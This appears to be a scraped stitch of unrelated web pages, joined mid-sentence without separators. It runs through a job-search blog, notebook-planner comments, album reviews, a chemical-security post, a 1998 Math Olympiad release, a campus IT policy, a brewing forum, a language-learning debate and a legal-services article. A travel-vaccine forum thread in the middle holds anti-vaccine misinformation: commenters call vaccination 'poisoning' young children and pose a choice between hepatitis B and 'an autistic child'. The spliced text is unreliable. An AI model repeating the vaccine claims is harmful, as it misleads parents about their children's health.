The impact of 'Affiction Day'(horrid name) will make no long term impact on the students. They will forget!
But to listen & learn through the experiences of others ... hearing of both their struggles and their triumphs ... may make a lasting impression just as it did for my son!Hovercraft Racing is a game aplication in which you are supposed to race against the computer in a hovercraft competition.

What this means for job seekers (active or passive) is that you must have a professional social media presence if you want to be ready for job search. What does this mean?
-
And DO NOT overlook Twitter, Google+. Facebook, Pinterest and the numerous other social network.
Armed and Ready for Your Job Search
You will want to hit the ground running as you embark on your job search! You really don’t want to waste time trying to figure stuff out, so start today- no matter what your employment status.
Read my post on US News & World Report to learn more about what you can do to ensure a productive, fast job search!
And if you feel like you aren’t making the progress you want in job search, you should probably read it too!
I couldn’t get comments to display at USNWR, so I’m commenting here. You appear to have totally misread the results.
You state that “only 11%” are concerned about their networking, and “only 7%” think they need to improve their social media skills. That’s ***not*** what the survey results show! The survey indicates that those percentages of respondents consider the listed skill the one they need the *most* help with, not the *only* one they need help with.
The only way your statements could be true is if all respondents were known to believe themselves prepared in all areas except one. If you believe that’s the case, then I may be able to sell you a bridge to Brooklyn!
To be fair, LHH also misstates what their results mean, but that’s no excuse for you to compound their mistakes with your own.
Hi Webster-
I hear what you are saying about what the data really means. I stand corrected.
However, my point is, and always will be, that people obsess over their resumes more than they should. If they spent half as much energy obsessing over developing their networking skills (to the tune of 33%), they would land jobs sooner!
What broad interpretation of this survey tells me is that job seekers under-estimate the importance of networking and social media- they don’t do either well and I long for the day they focus most on those skills.
PS: No need to write your bill of sale for the bridge, I’m not buying!This is my little black notebook where, every morning or evening, I make a list for the day ahead of me. From my ordinary routine to the special projects and deadlines, it gets written in this notebook. (Not to mention recipes and organization ideas along the way!)
Before I started using it, I was constantly misplacing my to-do lists and felt a general lack of daily accomplishment. I’ve been using it nearly every day for over a year now, and it’s become a part of me. Hardly an inanimate object, the pages practically breathe with the constant writing and turning.
It’s so simple, but keeping daily checklists has helped me in many ways, such as:
1. Look at the things I want to do
2. List the things I need to do
3. Check off the things I actually get done
4. Realistically look at how much time I waste
5. Evaluate and prioritize my time for efficiency
It has become more than a place for check lists: It has shown me the brevity of a day, a year.
I also appreciate the lack of pre-printed dates and check boxes. There’s something tangibly wholesome about writing it all by hand, just the way I need to see it laid out. The one thing this book cannot do is use my time wisely for me. ; )
What are some ways that you use to manage your time? Do you keep a daily planner, or loose sheets of paper? What helps you stay on track?
That looks like such a good idea! I usually just use post-it notes, but they are messy and somewhat lacking in inspiration. I’ll have to get a book like this. I’m really bad at keeping track of my time, so I appreciate this post!
I really think this is a great habit to get into. I am all set now to find an unused journal and start keeping my daily lists all in one place (for I usually write them in random notebooks and, of course, loose track of them). Thank you for sharing your idea! :)
What a beautiful idea Breezy! :D And I love how your stunning artwork is threaded thought your darling little notebook! It makes a nice keepsake, I should think, to look back on. :)
Right now I don’t have any set form of a way to manage my time..it might be a good idea to start one though. I’ve tried before to sort of “schedule” out my days but there are always interruptions, unexpected occurrences, and other misc. things that come along to change my plans for my day. So I haven’t done any kind of planning other than to just do my normal everyday routines and such and accomplish what needs doing next. :) Hehe. But I suppose it would be wise to perhaps keep a notebook like yourself – I certainly have my share of wasting time…
Thank you for the idea and the little “challenge” to spend time in a wise and God-honoring way! :)
Blessings in Christ,
~Rachel~
This is helpful and inspiring. I really enjoyed reading your post, Breezy. I have kept daily planners most of my adult life, and I enjoy organizing my days on paper. But I fell away from the practice when we moved–just when I probably needed it the most! Your example makes me want to get back to it.
Thanks for sharing this lovely, inspirational entry! Love it! Love the Photos!
I use a regular sized three-ring binder with regular lined paper. It’s very random and very doodled in.
Mrs.Wolf
I use an A5, day-to-a-page diary, and a cute little to-do notebook. I plan my day with the A5 diary, and jot down all the little ‘extra’ jobs that need doing in my to-do notebook. I then either work from my to-do notebook when I choose to just do all those little jobs, or I transfer a few jobs to my diary when I have the time to do a few jobs. I like having both because then I don’t loose track or forget about those little jobs, and I can see my day in its entirety, with all the things I need to do.
I love the look of your journal; it’s so pretty!
Jess
That’s a beautiful notebook you are keeping! I notice you doodle in it. It’s a nice touch to those blank pages. I have a planner that I keep up with the schoolwork that I have done for the day, but I haven’t anywhere to write the things that I want to do, goals for the next day, etc. I might have to steal your idea and get me a blank notebook. Plus that will give me an excuse to get another beautiful leather journal (I’m in love with these). lol
Have a blessed week!
I’ve kept similar things over the years. I’ve been lazy lately though. This is inspiring me to find a new one! :)
I love the poetic way you described your notebook: “Hardly an inanimate object, the pages practically breathe with the constant writing and turning.”
The idea of putting recipes, lists, and projects in the same book is one that has never occurred to me. Thank you for this inspiration to use my leather journal more often and fill it with useful and beautiful notes!
Blessings,
Caitie
What a wonderful idea! I have been thinking a lot recently about using my time to the utmost, but have been at a loss as to how to do it. I will definitely be putting this into practice in my life!
~Stephanie
What a beautiful idea! I use an A5 a-day-to-a-page diary and most of my pages are covered, not just with lists of things to do, but quotes and verses and doodles. I find it’s essential to keep me focused and stop me forgetting things. I’ve never thought of using a blank notebook and “creating” the pages as I go. I think that idea is lovely. It adds beauty to the every day and makes the diary a keepsake too!
I would be lost without my notebook–it’s my brains!!
But mine doesn’t have all the lovely doodles yours does:)
That is a very beautiful notebook you have. Not just the notebook itself, but all the thoughts and jotted notes that make it beautiful. I usually keep track of my lists on little scraps of paper—whatever I pick up from around the house. It’s something about the odd shape of each paper that makes it interesting—and each little paper I use for a certain note makes it memorable for me to find that specific note again. A have a whole drawer of these random papers and after I finish with a list of something, I’ll throw it away. That’s just me, but I think someday I need a notebook for these fleeting thoughts of mine.
My idea is pretty lo-tech–I use a yellow pad. One will work for each school year (we school at home) and each page is one week. On the front side of the yellow page are the week’s items to do or take care of and the menu; sometimes on the back I will jot down ideas that come to mind such as recipes or ideas for Christmas gifts. Phone numbers and other miscellany go in the margins. I have 4 of these yellow pads filled so far and they have proved an invaluable resource for me to go back through and chronicle things.

Hello Breezy! I was DELIGHTED to discover this past week that Noble Rose Press will be coming to our homeschool convention in June! (St. Charles MO) I am so excited; will YOU be coming? It would be wonderful to get to meet you! :) I have been following your blog for over a year….thank you for sharing the joys of life with all your followers. I hope we get to meet you in person!
We are also having a booth at our Conference (convention): here is our new site address for that:—manycountries.blogspot.com
I’ve been wanting to begin one of these ever since you posted this lovely little gem. I finally did last night after being again inspired by Rachel Phillip’s reference to it on her blog.
I like the idea of toning down my high-strung to do list tendencies with a little sketching, quoting & blessing counting. Like Rachel said, it will be a lovely keepsake for years to come.
Thank you for always sharing the little beauties of life. :)
What a lovely idea. :)
Oh, my, this is gorgeous, Breezy! You remind me of Beatrix Potter..I love your handwriting! What a good idea. :)
Dear Breezy,
It was so great to meet you at the conference yesterday! I feel so blessed to have met you and your sister. You were so much fun! And your outfit at the dance was lovely.
I love the little sketches in your notebook.
Love,
Allison
Oh how I wish I could draw. : ) I love your beautiful creations. Can you tell me how you learned to draw so well? We would love to give our children the opportunity to enjoy drawing. Of course our oldest is a mere 5 years old but she is starting her first official year of homeschooling this fall and we would love to add some art to the 3 R’s. I can’t wait to look around your site some more.
Blessings in Christ,
Emily
Hello, Breezy! I love, love, love your notebook planner. Much more creative way to plan and less restrictive too. I am on the hunt for a cute notebook so I can start one of these too. Thanks for the inspiration! I just wish I could draw like you…:) I have major time management issues and rarely accomplish everything I want/need to so this might revolutionize my life. Who knows what I’ll accomplish now..haha I could read your blog for hours! Love it!
~Erin
What a beautiful idea! I love your blogs, art work and inspiration! I too am keen to try journaling my time.
Thank you for sharing this post. It is indeed helpful to have a list or plan for each day. If we do not have a set of goals (whether small or great) to accomplish each God-given day, too often we will find ourselves looking back before we fall asleep at night and think, “A precious day wasted on meaningless pursuits and I can’t recall very much I got done or if I spent time in the most productive, God honoring way… What did I accomplish today?”
Living our lives with purpose and taking the necessary steps toward growth through keeping a journal or daily planner which lists our goals for each day is a wise decision!

iTunes Editors’ Notes
The members of Boston’s Lake Street Dive met at the New England Conservatory, where they imagined themselves as future jazz musicians. Playing together brought out their many influences, and the band now proves adept at soul, R&B, British Invasion rock, and new wave pop-rock. The loud, slashing guitars of “Stop Your Crying” prove they have a tough edge, courtesy of trumpet-playing guitarist Mike “McDuck” Olson. But it’s singer Rachael Price who sings above the glorious din with an urgent nerve that can be dialed down for the smooth adult pop of “Better Than.” There’s a light, easy flow to their musicianship that makes everything they play sound completely natural. It’s no surprise when they flash Motown credentials on the vocally rich “You Go Down Smooth”—or nail down so much with just bassist Bridget Kearney and drummer Mike Calabrese laying out the groove on “Use Me Up.” Their knowledge, their talents, their smarts, and their ability to bring it together in an emotionally compelling way is no hype; it's the very thing that defines superior musicianship everywhere.
Customer Reviews
Stellar
This band... amazing beyond amazing. Lake Street Dive is fronted by the beautiful and talented Rachel Price, she's got a stellar voice and killer energy. The band, full of charisma and personality! See them live, buy their records, experience this band, you won't be disappointed!
Finally!
This is the best LSD originals album. They're so great live that the studio versions of the songs pale in comparison, and that is saying a lot because they still sound incredible!
"Just Ask" live at the Rockwood in Jan. 2013 is the best version of the song.
"Bad Self Portraits" from Live and Breathing is wonderful.
"Better Than" from a 2012 Festival features Rachael scatting at the end, which I don't think made it onto the album (but should have!).
They're amazing songwriters and musicians and are totally redeeming this Millenial generation's concept of music. They're byfar my favorite band and are destined for super stardom. "Bad Self Portraits" is clever, sultry, and sung by an Ella/Etta/Diana mixture in the form of the gorgeous Rachael Price. And with Bridgette and McDuck writing a majority of the material featured on this album, they can do no wrong!
Fantastic
Saw them on Colbert and was blown away. This album is amazing. Incredible song writing and musicianship. With all of the garbage coming out of the music industry, this is one the most refreshing bands and albums I have ever heard.

Video.Bill Erny, the Senior Director for Regulatory and Technical Affairs at the American Chemistry Council, left an interesting comment on my first blog post (BTW: there should be at least one more posting in that series, probably this weekend) about the establishment of the Alternative Security Program (ASP) developed by that organization. While all reader comments are appreciated, it is particularly nice to have input from people directly involved in the development of important programs like this one (HINT: Is anyone in ISCD willing to comment?).
Time Savings
Bill did take exception to my comment:
“One thing is very clear to me, it is going to take much more work to complete the ACC ASP than it would be to answer the questions in the DHS SSP.”
He responded:
.”
This would certainly be true if the facility in question was already providing the level of detail really required for the proper analysis of the Site Security Plan submission. Since most facilities are not giving ISCD enough information I, think I’ll stand by my comment. But please don’t misunderstand me; this is almost certainly a good thing. A little extra time ensuring that facility submits the required information will save time in the long run as ISCD will not have to conduct Pre-Authorization Inspections with all of the follow-up delays that that has been causing.
More Useful Information
Bill makes another interesting point that should be obvious in retrospect:
“The DHS field inspectors who participated in the pilots also reported that the ACC ASP offers a significant improvement over the SSP for use during auditing.”
The data format in the current SSP data submission tool (I really do hate that DHS calls this a site security plan) is designed to be used by a computer, not people. Printing out a copy of the SSP submission has got to be one of the greatest wastes of trees in the federal bureaucracy. The ACC ASP, on the other hand should read and feel like an actual security plan for the facility. It should be a document that people at the facility should actually be able to use in the management of the plan and it will be a very helpful document for anyone that wants to audit the program.Competing against students from 75 other countries, Canadian high school students have won one gold, one silver and two bronze medals and an honourable mention at the 39th International Mathematical Olympiad (IMO), Taipei, Taiwan, July 10-21, 1998.
The six members of the 1998 Canadian IMO team are: Adrian Birka, Lakeshore Catholic High School, Port Colbourne, Ontario; Adrian Chan, Upper Canada College, Toronto, Ontario; Jimmy Chui, Earl Haig Secondary School, North York, Ontario; Mihaela Enachescu, Dawson College, Westmount, Québec, Yin (Jessie) Lei, Vincent Massey Secondary School, Windsor, Ontario, and Adrian Tang, Albert Campbell Collegiate Institute, Scarborough, Ontario.
At the Awards Ceremony (July 20, 1998) in Taipei, Taiwan, a Gold Medal was awarded to Adrian Chan, a Silver Medal to Mihaela Enachescu and Bronze Medals to Jimmy Chui and Adrian Tang. Jessie Lei Canadian team increased its standing to 20th out of 76 competing countries with a score of 113 points (out of a possible 252). At last year's IMO in Mar del Plata, Argentina, the Canadian team placed 29th out of 82 competing countries.
The top 10 teams and their scores are: Iran (211), Bulgaria (195), Hungary (186), USA (186), Taiwan (184), Russia (175), India (174), Ukraine (166), Vietnam (158), Yugoslavia (156).
The members of the 1998 Canadian IMO team will arrive in Toronto Pearson Airport (Terminal 2) Tuesday, July 21, 1998, at 11:15 p.m. [Air Canada flight 152].
Since 1981, Canadian students have received a total of 9 gold, 22 silver, and 41 bronze medals. The six members of the Canadian IMO team were selected from among more than 200,000 students who participated in local, provincial and national mathematics contests. Prior to leaving for the 39th IMO, the team trained at the University of Calgary, Calgary, Alberta from July 1st to July 12th.
The Canadian team members, who must be less than 20 years old when they write the IMO competition, pitted their skills against 419 of the world's best students. The 1998 IMO contest was set by an international jury of mathematicians, one from each country, and was written on Wednesday, July 15 and Thursday, July 16. On each day of the contest, there are three questions to be solved with a time limit of four and one-half hours. "It is similar to the Olympic decathlon but with six rather than ten parts," commented Wright.
The 1998 Team Leader was Dr. Christopher Small (Department of Statistics and Actuarial Science, University of Waterloo, Ontario) and the Deputy Team Leader, Mr. J.P. Grossman (Massachusetts Institute of Technology), a Canadian gold medalist at the 1992 IMO in Moscow, Russia. This year's team was also accompanied by Dr. Arthur Baragar, University of Nevada, and Dr. Dorette Pronk, Dalhousie University,.
"These competitions help make mathematics education more relevant, challenging and fun for students," said Dr. Small. "They provide Canadians with the opportunity to measure their abilities against those of the best in the world."
Sponsors of the 1998 Canadian team include: Alberta Education, Amex Canada Inc., the Bank of Montreal, Canadian Airlines International, the Canadian Mathematical Society, the Centre for Education in Mathematics and Computing, University of Waterloo, Dalhousie University, Hewlett-Packard (Canada) Ltd., Industry Canada, the McLean Foundation, the Ontario Ministry of Education and Training, the Pacific Institute for the Mathematical Sciences, Pratt and Whitney Canada, the Quebec Ministry of Education, the Samuel Beatty Fund, the Senator Norman M. Paterson Foundation, Sun Life Assurance Company of Canada, the University of Calgary, the University of Ottawa, the University of Toronto, Upper Canada College and Waterloo Maple.
The 40th International Mathematical Olympiad will take place in Romania in July 1999, the country that hosted the first IMO in 1959.Virginia Home Grown

Students are encouraged to change their passwords every few months. Please make sure that your password is a combination of atleats one numeric, one special characters and is should atleast be eight characters long if possible. Please do not use your usernames as passwords.
The onus of maintaining security of their accounts by using proper password practices lies with the student. Your username and passwords gives you access to the various services inside the institute, these services have a monetary component associated with them for example access to institute printers. You sharing your passwords is as good as sharing your own printer account. This leaves a door open for abuse.
Starting this year we have completely automated the process of registering student computers. This registration is mandatory to ensure compliance with NKN directives of which the institute is a part of and also to ensure proper management.
Any unregistered computer accessing the internet will be redirected to a captive portal where he will be challenged for a username and password which in the case of TISS students is their email username and password. The student has to accept the fair use policy on the captive portal page, unless they accept the fair use policy they will not be given access to the internet/intranet in the institute. Please read the fair use policy carefully before accepting it.
Students can register only upto three devices of any make or kind with us. The computer center will provide support for only laptops. As for smart phones or tablets they may or may not work with our system.
Students can take printouts from the three printers in the Cyber library. While using the printers we advise that you make use of the paper judiciously by printing on both sides of the paper. Please remember every printout you take means a forest lost somewhere. If possible please avoid taking printouts until absolutely necessary. Also avoid taking printout of photographs as they consume a lot of ink.
The printing charges are Rs. 1/- per pages. Only GOI-PMS students get 2000 pages of free printouts for 2 year degree course. Soon we will have a system where students can log into their personal area on this website and get their printer usage statistics. The details of which we will put on this website.
TISS has a moodle LMS website where all course related readings can be accessed by students. Students can login to the moodle website and enrol for the courses after which they will get access to their course materials.
All students will be issued smart cards which they are supposed to use for attendance at the Foundation courses.

I've got a good, strong Porter-Cable drill that I use to power my Crankandstein 3-roller mill. Unfortunately, its two batteries are not so good and strong anymore, and they cost about $50-70 apiece to replace. Where I brew now, I have an electrical outlet just a few feet away, so there is no issue with using a corded drill. It appears that a very good corded drill could be had for around the price of one of the batteries.
I am anything but Tim the Toolman. I know I need torque more than speed, and I don't need a lot of bells and whistles, but I do like overkill.
Anybody have any recommendations?

I use the Skil 6335 power drill at my shop. It has worked great for about three years now. Plenty of torq and power. I think it ran me about $75.00 when I bought it. I had gone through a couple of Dewalt battery powered drills before that.

I use an ancient Sears 3/8" variable speed corded drill I found at a tag sale to power my BarleyCrusher. I think I paid $5. More than enough power to do the job, even running at slow speed (which, IMO, gives a better crush). I've been told numerous times "You'll burn that motor out!" by well-meaning busybodies. But it has done dozens of batches without releasing any smoke.

There must be something wrong with me, but I've never seen the need to motorize my mill. It takes about as much energy to grind the grain for a 10 lb. batch as it does to ride my bike a mile or so.

Interestingly, Bill, I just cleaned out one of my garage bays and came across my old mill handle from when I did 5-gallon batches with a 2-roller mill. I hand-crushed many a batch.
However, now that I'm doing 10-gallon batches (occasionally more) and often making higher-gravity batches with 25-30 (occasionally more) pounds of grain, it's just impractical. It's enough of an inconvenience that I only have a 9-pound hopper - I'm not willing to bear any further inconvenience these days.
Hey guys, is it safe to assume that higher amperage equates to higher power? I understand that the gearing might be different, but on the whole, is this a safe assumption?

BP, I wish you had been around back in the day when my brother and I got the duty of hand cranking the home made ice cream mixer . . taking turns cranking and sitting on the mixer. When the motorized ice cream makers came out we were elated!
Graham, if you're not planning on a dedicated motor and sheave configuration, I'd bet any drill would do. Even the Chinese stuff from Harbor Freight would probably fit the bill and the price is such that you can think, "Disposable".

Graham, current is proportional to torque in an electric motor. You want a drill motor with a high current rating. I have a 7 amp 1/2 inch drill motor for use on my JSP mill. It gets a little warm when crushing for a big batch, but my hands like that on a cold winter morning.

I have a corded 7 Amp 1/2" Black and Decker. Up to 800 RPM, IIRC. Works like a charm with my Barleycrusher. It's probably more than what I need, but that's fine with me. Was ~40 bucks at Home Despot.
Bill-- There is nothing I hated more than hand cranking grain. It did have certain rustic appeal, I'll give you that.

When my cordless drill started to wear out I picked up a cheap drill from Target for about $12. I figured 12 bucks was a reasonable price to spend on an experiment and it has paid off; the drill is still going 5 years later.

I am NO advocate of vaccines! There is a really good book out there called "What Your Doctor May Not Tell You About Children's Vaccinations" by Stephanie cave, if you look it up on amazon, a host of other books will show up too that may be helpful. I think it is important to understand the risk of the disease & how to treat it rather than just poisoning your VERY YOUNG, still developing child because you don't have all your information. I have been happy with Susan Delaney at the Wellness alliance in Carrboro. She is a Naturopath, not a pediatrician, but she may be able to help you. Would you rather live with hep B or an autistic child? Vaccines are no guarantee of protection, either...things to think about. It really is a matter of research & weighing all the pros & cons to conclude which risk you can live with. You will never regret spending the time to research it your self. Research Costa Rica as well, I saw one post that mentioned it tends to be a cleaner South American Country. Good Luck to you!

I know you already posted that you were just going to go the holistic route but wanted to add something. If you've been to Costa Rica before you know that it is one of the cleanest and safest Latin American countries. Not trying to knock any of the others, but in comparison to other "third world" countries it is easy to find clean places to eat and public places are quite clean. Vaccines only really become an issue if you will be going someplace VERY rural for an extended period of time. I studied in Costa Rica for a semester in college and went on various other trips there and I didn't ever need vaccines for those trips. So, as long as you use a little common sense (the same you would use here!) I don't think your little one will even be exposed to anything dangerous. Hope this helps put your mind at ease a little!

S.,
there are many holistic docs out there....google PAVE organization or try NVIC organization and also try Holistic Mothers Network......these organizations can help you.......
Regarding the military, let's not forget all the men and women serving our country who are very ill from the vaccinations they were forced to take! How about the toddler from Indiana whose father was in Iraq; when the father came home, the little boy suffered a life threatening disease that he caught from his father who had the small-pox vaccine awile before. The wife also caught a small form of illness from her husband, but she was able to be treated outside the hospital.....
Look up ABC or CNN if you don't trust my response.
Better yet, look up the exact ingredients of the vaccinations from the medical industries who are creating them.
Our own government has created a system called VAERS. Look it up! It's a data system where the government keeps track of all persons injured by vaccinations....our government pays out billions of dollars to people being hurt by vaccines!
Anyone read USA today this past week....the front page read something like, "doctors admit to receiving money from pharmaceutical companies".....
Do research on anything that goes into or on you and your children's bodies........I did....a long time ago!

Definately consult your pediatrician. We had to get Aryan's done at 18 months as well. He couldn't get the typhoid b/c it's not approved for kids under 2 yet. So technically the only one he had to get was the Hep A shot which is now required by CDC. So have you looked into exactly which ones she will need? Aryan also had to take Malara tablets, but when we started to take those, he had a reaction to them so I had to stop them. :( But he survived.
The ones recommended in India where we went was Hep A, Tetnus, typhoid and Hep B. Considering he had all them but Hep a series and Typhoid he only had to have one.
I know each child is different but I would recommend doing them NOW if you can only so that you can take action if she DOES have a reaction.
Good luck!

LEXINGTON, Ky. - Baylor head coach Matt Knoll's young 39th-ranked men's tennis squad upset seventh-ranked Kentucky in Lexington, 4-3, snapping the Wildcats' 14-match home win streak. The victory at the Boone Tennis Complex came down to the very last match on when Diego Galeano and Mate Zsiga, playing together for the very first time, won a tiebreak on court 3 to clinch the match for the Bears.
The loss was the Wildcats' first home loss since dropping a match to Ohio State last season. They are now 54-10 at home since the start of the 2009 season.
The victory raised Baylor's record to 10-7 while Kentucky drops to 15-4. The Bears have now won six of their last eight matches, their two losses were at No. 4 UCLA and at No. 24 Tennessee. In a reversal of the normal order of play, singles was contested first.
The Wildcats got on the board first when, playing at No. 3, Anthony Rossi downed Marko Krickovic, 6-2, 6-2. Baylor would go up 3-1 with a sweep of courts 5, 4 and 1, respectively. Kike Grangeiro earned Baylor its first point with a 6-4, 7-5 triumph over 99th-ranked Alejandro Gomez, Diego Galeano followed with a 6-3, 6-4 win over No. 101 Tom Jomby and Mate Zsiga put BU up 3-1 with an upset win over No. 5 Eric Quigley, 6-4, 7-6(8).

a really great tutorial on distressing furniture[Authors Note: I'm not a Benny expert. The following is what I gleaned from only parts of Benny's Mission. If you want to understand his methods more, head to his site (link below)]
Benny learned Chinese. If you were in a hole earlier this year (or don’t read language learning blogs), you might have missed it.
I never really knew what to think of Benny.
He’s a polyglot, I focus on learning one language.
He’s all about conversations, I’m all about learning through listening, watching tv, and reading. It didn’t help that I could sense a lack of fluency in some of his videos. Even though I didn’t really pay close attention to what he was doing, I doubted his skills, and questioned his approach. When Benny was learning languages like But who am I to say that someone learning Polish isn’t doing a good job of it? So when he decided to learn Chinese, it gave me an opportunity to take a close look at his methods.
Talky, Talky, Talky?
A quick reading of Benny’s blog will leave you with the impression that Benny is all about speaking and that he doesn’t care about grammar or vocabulary at all. It’s one of reasons I secretly doubted him. But from watching his videos, it’s clear to me that he’s compressing his studies, that is, he’s working on grammar, vocabulary and speaking all at the same time. This is advanced language kung fu.
How does he do it? By memorizing a dialogue and recording himself speaking it. The dialogues that Benny memorizes are full of useful vocabulary and grammatical patterns. Learning the dialogue teaches him vocabulary and memorizing sentences forces grammatical patterns into his mind. Finally, recording himself gives him ample time to practice speaking.
This approach also has the benefit of providing Benny with feedback and lets him gauge his progress.
Downsides to the Benny approach
If you want to be really fluent (e.g. native speakers can’t tell you’re not a native speaker), then you’ll need to do more. More listening, more grammar, more vocabulary. The good news is many of Benny’s techniques scale: you could learn a lot of Chinese grammar and vocabulary by learning and memorizing different dialogues, for example.
But you’ll never master tones (or even pinyin) without lots of listening. If Benny wanted to spend another 9 months learning a language, I’m sure he’d spend more time listening (but he’d probably find some way to combine listening with another activity) and he’d end up being relatively fleunt.
On the other hand, Benny’s not really trying to be fluent. His goal was never to be able to play chengyu games or do a xiangsheng routine. His goal was to get to a level where you can start engaging with real people who speak the language. If you’re planning a trip a few months from now, it’s a good method to try. I wouldn’t call it fluency, though.
What did you learn from Benny’s 3 months of Chinese?
“If you want to be really fluent (e.g. native speakers can’t tell you’re not a native speaker)…”
“Benny’s not really trying to be fluent”
Fluency is not the same as being mistaken for a native speaker all the time. From the Oxford English dictionary:
FLUENT:
1 speaking or writing in an articulate and natural manner. 2 (of a language) used easily and accurately.
There is no 3: Sound like you were born and raised speaking the language.
I agree with you that I wouldn’t call what I have fluency yet, but I continue to improve on it. The level I did reach (as of about one month ago) was B1 spoken (a.k.a. lower intermediate), as confirmed by the LTL school. I’ll upload more videos in a few weeks for what I reached at the end of my entire stay in Asia, and will continue to improve this summer so the project is far from over.
To me, fluency is a solid B2/low C1 and upwards. C2 is mastery and anything higher is verging on bilingual. Don’t mix up “fluent” and “bilingual”.
With comments like “I don’t care about vocabulary”, it’s pretty clear you don’t know what my approach involves and other things you say show you weren’t even watching my videos or reading what I wrote. Memorising dialogues was only part of my first month. Every other video I made since then was entirely spontaneous. I couldn’t have gotten LTL’s evaluation based on scripted conversations.
If you want to aim for the ludicrous goal of getting confused for a native all the time (I don’t see the point? Want to become a spy or something? I prefer to focus on genuine communication), all the studying in the world won’t make a sniff of difference if you aren’t using the language with actual people (rather than only grammar and vocab books) for some real feedback.
Thanks for the post, but I’m disappointed that you were not actually paying attention enough to see that my dialogues were spontaneous or that I always say that I care about learning vocabulary. Saying all I do is talk-talk-talk is such a weak oversimplification of efficient immersion strategies that many people apply. There is no “Benny approach”. I only have my own particular style of efficient immersion.
@Benny:
I appreciate you coming over to comment (and correct) my post.
Most of your criticisms are correct: I’ve never paid close attention to what you’re doing. I stated so at the beginning of the post. The impressions I have from quick readings of your blog did leave me with the impression that you don’t really care about vocabulary or grammar. You can’t fault my impressions.
And by dialogue, I meant the monologues you’d occasionally record. You’re correct in saying that your dialogues were spontaneous.
We’ll continue to disagree about what fluency is, but I do think trying to achieve B2 / C1 level of a language is pretty good goal to have.
Achieving a ludicrous goal isn’t such a bad thing. I’ve talked to people on the phone who had no idea I wasn’t native Chinese speaker: when we met, they’d start out insisting I wasn’t the person they spoke to. I don’t think it’s right (or very nice) to criticize or belittle anyone’s goals. It doesn’t matter how big or small one’s goals are; what’s important is making progress towards achieving those goals.
I must say, I am a bit confused by you’re last comment:
I’d call that Benny’s approach. I don’t think I’m alone in calling it that.
I don’t see the point in writing a blog post about something you clearly have no idea about, but at least you are honest about it. I should point out that I haven’t recorded a single monologue video in Chinese since my one month point. I find it ironic that you talk about being in a “hole” this year, because that’s exactly where I feel you were since February…
Aiming to sound like a native is a noble goal, and something I’ve written about recently. But it happening 100% of the time is not going to happen unless you really are a native. Your phone conversation is impressive, but far from what many people consider “native speakers can’t tell you’re not a native speaker”.
I have indeed been confused as a native speaker in French, Spanish and Portuguese, and to me it entails as much an impressive accent and mastery of the language as it does body language, cultural appreciation, dress sense, distance you put yourself from the other person, how long you maintain eye contact etc. Skipping all that and only doing it on the phone is where I have to put it back to you that we differ in our definitions. You think I’m too flexible with the world “fluent” and I in turn think you are too flexible with the term “native speakers can’t tell” unless you specifically add “… on the phone”.
However, I was confused as a native on the phone too in Chinese, shortly after arrival in the mainland (in Wuhan). Not because my Chinese is so amazing, but because the Chinese simply don’t expect to talk to foreigners when they make a local phone call. There aren’t enough of us to make this something to consider. All my mistakes and hesitations meant that for almost 30 seconds someone must have just thought I was a really stupid illiterate native with a speaking impediment and was genuinely surprised when I said I couldn’t follow what he was saying because I am a foreigner.
This is why I don’t hold telephone conversations as the standard for counting as being confused for a native. This is harder in Chinese because of ethnic differences of course, and why the line may have to be drawn with a telephone conversation. But to me, the other person can FEEL like you are a native when you act like one as well as sounding like one, even when your skin colour may say differently.
What I find ludicrous is simply this binary view of language learning, and this idea that fluency is nothing less than sounding like a native speaker! With that logic, every C2 speaker and pretty much every professional (translator/interpreter etc.) don’t speak “fluently”. Aiming for perfection is impossible, that’s what I mean.
If you are happy with your current level, good for you! But if you want to point out not being “right or nice”, then perhaps you’ll appreciate that I didn’t feel this post was so nice in misrepresenting me. But I appreciate your straightforwardness at least.
@Benny:
I apologize if you feel misrepresented. It wasn’t my intent. I added some language to the beginning of the post to try and address that.
No need to be so defensive. I wasn’t trying to attack you. This post should be read in the following way:
1) I had impressions about how and what you did.
2) After looking at parts of your Chinese mission, I found that you do have some very strong methods (kung fu).
3) The methods you used good for acquiring a decent baseline in Chinese, but in order to progress beyond that, one would need to change their strategies.
As for the phone call: I’m not talking about a short conversation like the ones you described. I’m talking about longer drawn out conversations where the person.
A better analogy would be this: to sit behind a Chinese screen and have a conversation with a native speaker for a few minutes without them realizing they weren’t speaking to a native speaker. It would be like a Turing Test for Chinese, if a majority of native speakers think a person is a native speaker, then that person has native-level skills.
I agree, a binary view of language learning is ludicrous. My view of language learning has many different levels, including being a beginner, competent, proficient, conversational, or fluent. Each level also has many different stages, as well.
Fair enough. Thanks for the explanation.
Benny, you say here that you don’t see the point of getting confused for a native, but I honestly thought that *was* part of your ideal level of acquisition: to learn a language so well that locals can’t tell you’re a foreigner. I could’ve sworn I read a comment from you on someone else’s blog saying (paraphasing) “when I do decide to take on an East Asian language I want to get to the point where even if the locals will be able to tell I don’t look like one of them, they won’t be able to tell whether or not I grew up among them.”
That was 2-3 years ago, so maybe you’re attitude here has changed?
My position on that quote hasn’t changed. But see this very recent post for a better understanding:
However, getting mistaken for a native SOME of the time is a point I aim for beyond 3 months. If you define fluent as no different to bilingual, then of course you’re not going to like a blog with the title mine has. But most people don’t understand the word that way.
My point of sounding and acting as convincingly native as possible is because it makes other people feel way more open to communicate and share with you when they “forget” you were born in another country.
We always treat foreigners differently. When this fact has slipped the minds of Brazilians, Spaniards and French I’m with (even if they are “aware” that I’m Irish so it has nothing to do with fooling people), I notice a very different and more intimidate way of talking to me. This is what I do it for.
My long term goal with Chinese still complies with that quote, but it was never my objective for these 3 months
What Benny achieves in three months isn’t what I, or even most people, would call fluency. But it is extremely impressive and better than what the vast majority of people manage in three months. I’d also say it’d be a very good way to get started on the road to fluency.
I guess “Impressive proficiency in three months” isn’t quite such a catchy blog title, though.Beer on the Rails: The Simple Pleasure of Train TravelMay 4, 2015 -For those who must litigate and who cannot afford to hire an attorney to represent them or who want to be in control of their own case, unbundled services can be a great solution.
Unbundled legal services, also known as limited-scope services, are legal services that are broken down and offered as individualized legal services, instead of “bundled” legal services–which generally means full legal representation. An attorney offering unbundled legal services makes it possible (and financially feasible) for someone to receive vital legal assistance without incurring great financial detriment.
In limited scope or unbundled representation, an attorney and client agree to limit the scope of the attorney’s involvement in a lawsuit or other legal action to specific items, leaving responsibility for other aspects of the case to the client in order to save the client money.
There are pros and cons to this approach. The pros for the client are saving money on attorney’s fees and possibly getting the case/issue resolved at a faster pace. The cons are that there are oflten pitfalls for those untrained in the law, so if a matter is complicated or if you feel it is too complicated for you, then perhaps full representation is warranted.
TYPES OF UNBUNDLED LEGAL SERVICES
• Consultations
